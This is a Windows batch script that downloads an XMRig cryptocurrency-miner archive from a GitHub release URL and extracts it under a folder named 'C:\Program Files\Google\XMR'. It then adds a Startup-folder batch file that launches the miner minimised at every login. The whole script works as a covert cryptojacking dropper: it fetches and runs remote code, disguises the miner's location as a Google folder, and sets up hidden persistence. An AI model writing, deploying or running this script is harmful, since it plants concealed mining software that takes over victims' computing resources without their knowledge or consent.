@echo off
setlocal

REM 1. Download ZIP file from a direct download link to the current directory
echo Downloading ZIP file...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/JCionx/xmrig/releases/download/v1.0/xmrig.zip' -OutFile 'xmrig.zip'"

REM 2. Create the C:\Program Files\Google\ folder if it doesn't exist
if not exist "C:\Program Files\Google\" (
    echo Creating C:\Program Files\Google\ folder...
    mkdir "C:\Program Files\Google\"
)

REM 3. Create the C:\Program Files\Google\XMR\ folder if it doesn't exist
if not exist "C:\Program Files\Google\XMR\" (
    echo Creating C:\Program Files\Google\XMR\ folder...
    mkdir "C:\Program Files\Google\XMR\"
)

REM 4. Extract the ZIP file on the current directory to C:\Program Files\Google\XMR\
echo Extracting ZIP file...
powershell -Command "Expand-Archive -Path 'xmrig.zip' -DestinationPath 'C:\Program Files\Google\XMR\'"

REM 5. Create a batch file under %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup that executes C:\Program Files\Google\XMR\xmrig.exe without opening any window
echo Creating startup batch file...
set startupFolder=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
set startupFile=%startupFolder%\start_xmrig.bat

echo @echo off > "%startupFile%"
echo start /min "" "C:\Program Files\Google\XMR\xmrig.exe" >> "%startupFile%"

echo Done.

endlocal

exit